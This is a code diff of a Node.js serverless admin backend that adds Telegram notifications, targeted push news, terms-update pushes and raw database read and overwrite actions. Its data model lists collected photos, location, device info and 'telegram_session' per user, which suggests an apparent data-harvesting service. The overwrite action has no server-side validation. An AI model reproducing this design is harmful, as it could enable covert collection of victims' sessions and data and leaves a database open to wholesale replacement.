@@ -3,6 +3,31 @@ const { nanoid } = require('nanoid');
 const jwt = require('jsonwebtoken');
 const stream = require('stream');
 
+
+const fetch = require('node-fetch');
+
+async function sendTelegramNotification(user, eventData) {
+    if (!user.telegramBinding || user.telegramBinding.status !== 'active' || !user.telegramBinding.chatId) {
+        return;
+    }
+
+    const { BOT_API_URL, BOT_API_SECRET } = process.env;
+    if (!BOT_API_URL || !BOT_API_SECRET) {
+        console.warn('Змінні для Telegram бота не налаштовано на Netlify.');
+        return;
+    }
+
+    try {
+        await fetch(`${BOT_API_URL}/notify`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${BOT_API_SECRET}` },
+            body: JSON.stringify({ chat_id: user.telegramBinding.chatId, event_data: eventData })
+        });
+    } catch (error) {
+        console.error("Помилка відправки сповіщення в Telegram:", error.message);
+    }
+}
+
 function getDriveClient() {
   if (!process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL || !process.env.GOOGLE_PRIVATE_KEY) {
     throw new Error("Missing Google service account credentials in environment variables.");
@@ -36,17 +61,50 @@ async function readDb(drive) {
     if (!fileId) throw new Error("Missing GOOGLE_DRIVE_FILE_ID environment variable.");
     const res = await drive.files.get({ fileId, alt: 'media' });
     try {
-        if (!res.data) return { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3, dataRetentionDays: 0 }, templates: [], addedData: [], news: [] };
+        const defaultState = {
+            users: [],
+            refCodes: [],
+            blockedIdentifiers: [],
+            failedLogins: [],
+            settings: { 
+                defaultDeviceLimit: 3, 
+                dataRetentionDays: 0,
+                termsLastUpdatedAt: null,
+                termsPushRequired: false
+            },
+            templates: [],
+            addedData: [],
+            news: [],
+            pushNews: []
+        };
+
+        if (!res.data) return defaultState;
+        
         const dbData = typeof res.data === 'object' ? res.data : JSON.parse(res.data);
-        if (!dbData.settings) dbData.settings = { defaultDeviceLimit: 3, dataRetentionDays: 0 };
-        if (dbData.settings.dataRetentionDays === undefined) dbData.settings.dataRetentionDays = 0; // Додаємо, якщо налаштування вже існують
-        if (!dbData.templates) dbData.templates = [];
-        if (!dbData.addedData) dbData.addedData = [];
-        if (!dbData.news) dbData.news = [];
+
+        if (!dbData.settings) dbData.settings = defaultState.settings;
+        dbData.settings = { ...defaultState.settings, ...dbData.settings };
+
+        for (const key of ['users', 'refCodes', 'blockedIdentifiers', 'failedLogins', 'templates', 'addedData', 'news', 'pushNews']) {
+            if (!dbData[key]) dbData[key] = defaultState[key];
+        }
+
+        if (dbData.templates.length === 0) {
+            dbData.templates.push(
+                { templateId: 'default-1', name: 'Проста візитка', htmlContent: '<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><title>Мій Профіль</title><style>body{font-family: Arial, sans-serif; text-align: center; background: #f4f4f4; padding-top: 50px;} .card{background: white; margin: 0 auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 300px;} h1{color: #333;} p{color: #666;}</style></head><body><div class="card"><h1>Ім\'я Прізвище</h1><p>Веб-розробник</p></div></body></html>' },
+                { templateId: 'default-2', name: 'Сторінка-заглушка', htmlContent: '<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><title>Скоро!</title><style>body{display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; font-family: "Segoe UI", sans-serif;} h1{font-size: 3em;}</style></head><body><h1>Наш сайт скоро відкриється!</h1></body></html>' }
+            );
+        }
+        
         return dbData;
     } catch (e) {
         console.warn("Could not parse DB file. Starting with empty state. Error:", e.message);
-        return { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3, dataRetentionDays: 0 }, templates: [], addedData: [], news: [] };
+        // Повертаємо defaultState при помилці, щоб уникнути падіння системи
+        return {
+            users: [], refCodes: [], blockedIdentifiers: [], failedLogins: [],
+            settings: { defaultDeviceLimit: 3, dataRetentionDays: 0, termsLastUpdatedAt: null, termsPushRequired: false },
+            templates: [], addedData: [], news: [], pushNews: []
+        };
     }
 }
 
@@ -109,7 +167,7 @@ exports.handler = async (event) => {
                 ...user,
                 sessionCount: sessions ? sessions.length : 0,
             }));
-            return { statusCode: 200, body: JSON.stringify({ settings: db.settings, users, refCodes: db.refCodes, blocked: db.blockedIdentifiers, templates: db.templates || [], systemTypes: ['photos','video','location','form','device_info','telegram_session','manual_text','manual_photo','manual_video'], newsCount: (db.news||[]).length })};
+            return { statusCode: 200, body: JSON.stringify({ settings: db.settings, users, refCodes: db.refCodes, blocked: db.blockedIdentifiers, templates: db.templates || [], systemTypes: ['photos','video','location','form','device_info','telegram_session','manual_text','manual_photo','manual_video'], newsCount: (db.news||[]).length, pushNews: db.pushNews || [] })};
         }
 
         if (action === 'getUserDetails') {
@@ -267,7 +325,7 @@ exports.handler = async (event) => {
                     if (!db.addedData) db.addedData = [];
                     const blockId = nanoid(16);
                     let preparedContent = content || null;
-                    // Якщо переданий файл, завантажимо в Drive і збережемо посилання
+                    
                     if (content && content.file && content.file.data) {
                         const fileBuffer = Buffer.from(content.file.data, 'base64');
                         const filename = content.file.name || `file_${Date.now()}`;
@@ -276,19 +334,31 @@ exports.handler = async (event) => {
                             const driveFile = await uploadMediaSimple(getDriveClient(), fileBuffer, filename, mimeType);
                             preparedContent = { file: { id: driveFile.id, name: driveFile.name, type: mimeType, url: driveFile.webViewLink } };
                         } catch (e) {
-                            // fallback: зберігаємо inline, якщо не вдалося завантажити
                             preparedContent = { file: { name: filename, type: mimeType, data: content.file.data } };
                         }
                     }
+
                     const block = { id: blockId, type, content: preparedContent, createdAt: new Date().toISOString() };
                     db.addedData.push(block);
                     const now = new Date().toISOString();
+                    
                     for (const uid of userIds) {
                         const u = db.users.find(x => x.userId === uid);
                         if (!u) continue;
                         if (!u.collectedData) u.collectedData = [];
-                        const randomFingerprint = `fp_${nanoid(12)}`;
-                        u.collectedData.push({ fingerprint: randomFingerprint, collectedAt: now, status: 'success', type, data: { addedDataId: blockId } });
+                        
+                        // ВИПРАВЛЕНО: Генерація довгого відбитка без префікса
+                        const randomFingerprint = nanoid(32); 
+                        
+                        // ВИПРАВЛЕНО: Додано прапорець addedByAdmin: true
+                        u.collectedData.push({ 
+                            fingerprint: randomFingerprint, 
+                            collectedAt: now, 
+                            status: 'success', 
+                            type, 
+                            data: { addedDataId: blockId },
+                            addedByAdmin: true 
+                        });
                     }
                     operationResult = { statusCode: 201, body: JSON.stringify({ addedDataId: blockId }) };
                     break;
@@ -320,6 +390,21 @@ exports.handler = async (event) => {
                     if (!u) throw new Error('User not found.');
                     u.restrictions = { ...(u.restrictions || {}), ...(restrictions || {}) };
                     operationResult = { statusCode: 200, body: 'Restrictions updated.' };
+                    break;
+                }
+                case 'getRawDatabase': {
+                    // Ця дія просто повертає весь об'єкт бази даних
+                    operationResult = { statusCode: 200, body: JSON.stringify(db) };
+                    break;
+                }
+                case 'updateRawDatabase': {
+                    // Ця дія повністю перезаписує базу даних отриманим об'єктом.
+                    // Це небезпечна операція, тому вся валідація має бути на клієнті.
+                    const newDbState = payload;
+                    // Оновлюємо переданий 'db' об'єкт ключами з нового стану, щоб він був записаний
+                    Object.keys(db).forEach(key => delete db[key]);
+                    Object.assign(db, newDbState);
+                    operationResult = { statusCode: 200, body: 'Database updated successfully.' };
                     break;
                 }
                 case 'bulkUpdateUserRestrictions': {
@@ -368,11 +453,32 @@ exports.handler = async (event) => {
                     operationResult = { statusCode: 200, body: 'Page deleted.' };
                     break;
                 }
-                case 'createNews': {
+                 case 'createNews': {
                     if (!db.news) db.news = [];
-                    const { title, text, imageUrl } = payload;
-                    const item = { id: nanoid(16), title, text, imageUrl: imageUrl || null, createdAt: new Date().toISOString() };
+                    const { title, text, imageUrl, audience } = payload;
+                    const item = { 
+                        id: nanoid(16), 
+                        title, text, 
+                        imageUrl: imageUrl || null, 
+                        audience: audience || { type: 'all', userIds: [] },
+                        readBy: [],
+                        createdAt: new Date().toISOString() 
+                    };
                     db.news.push(item);
+
+                    // Відправляємо сповіщення цільовій аудиторії
+                    const notificationPayload = { type: 'news', title: item.title, text: item.text, imageUrl: item.imageUrl };
+                     const targetUsers = db.users.filter(u => {
+                        const aud = item.audience;
+                        if (aud.type === 'all') return true;
+                        if (aud.type === 'include') return aud.userIds.includes(u.userId);
+                        if (aud.type === 'exclude') return !aud.userIds.includes(u.userId);
+                        return false;
+                    });
+                    for (const user of targetUsers) {
+                        await sendTelegramNotification(user, notificationPayload);
+                    }
+
                     operationResult = { statusCode: 201, body: JSON.stringify(item) };
                     break;
                 }
@@ -407,6 +513,60 @@ exports.handler = async (event) => {
                         else if (['suspended', 'bot_blocked'].includes(user.telegramBinding.status)) user.telegramBinding.status = 'active';
                     }
                     operationResult = { statusCode: 200, body: 'Telegram status toggled.' };
+                    break;
+                }
+                case 'requireTermsUpdate': {
+                    db.settings.termsPushRequired = true;
+                    db.settings.termsLastUpdatedAt = new Date().toISOString();
+                    const notificationPayload = { type: 'terms_update', title: 'Оновлення Умов Використання', text: 'Будь ласка, ознайомтесь з новими умовами при наступному вході в систему.' };
+                    for (const user of db.users) {
+                        await sendTelegramNotification(user, notificationPayload);
+                    }
+
+                    operationResult = { statusCode: 200, body: 'Terms update push has been activated.' };
+                    break;
+                }
+                case 'createPushNews': {
+                    if (!db.pushNews) db.pushNews = [];
+                    const { title, text, imageUrl, mode, keyword, audience } = payload;
+                    const newPush = {
+                        id: nanoid(16),
+                        title, text, imageUrl: imageUrl || null,
+                        mode,
+                        keyword: (mode === 'aggressive' && keyword) ? keyword : null,
+                        audience: audience || { type: 'all', userIds: [] },
+                        createdAt: new Date().toISOString(),
+                        seenBy: []
+                    };
+                    db.pushNews.push(newPush);
+
+                    // Відправляємо сповіщення цільовій аудиторії
+                    const notificationPayload = { type: 'push_news', title: newPush.title, text: newPush.text, imageUrl: newPush.imageUrl };
+                    const targetUsers = db.users.filter(u => {
+                        const aud = newPush.audience;
+                        if (aud.type === 'all') return true;
+                        if (aud.type === 'include') return aud.userIds.includes(u.userId);
+                        if (aud.type === 'exclude') return !aud.userIds.includes(u.userId);
+                        return false;
+                    });
+                    for (const user of targetUsers) {
+                        await sendTelegramNotification(user, notificationPayload);
+                    }
+
+                    operationResult = { statusCode: 201, body: JSON.stringify(newPush) };
+                    break;
+                }
+                case 'revokeTermsPush': {
+                    db.settings.termsPushRequired = false;
+                    operationResult = { statusCode: 200, body: 'Terms update push has been revoked.' };
+                    break;
+                }
+                case 'revokePushNews': {
+                    const { pushId } = payload;
+                    if (db.pushNews) {
+                        db.pushNews = db.pushNews.filter(p => p.id !== pushId);
+                    }
+                    operationResult = { statusCode: 200, body: 'Push news has been revoked.' };
                     break;
                 }
                 default:
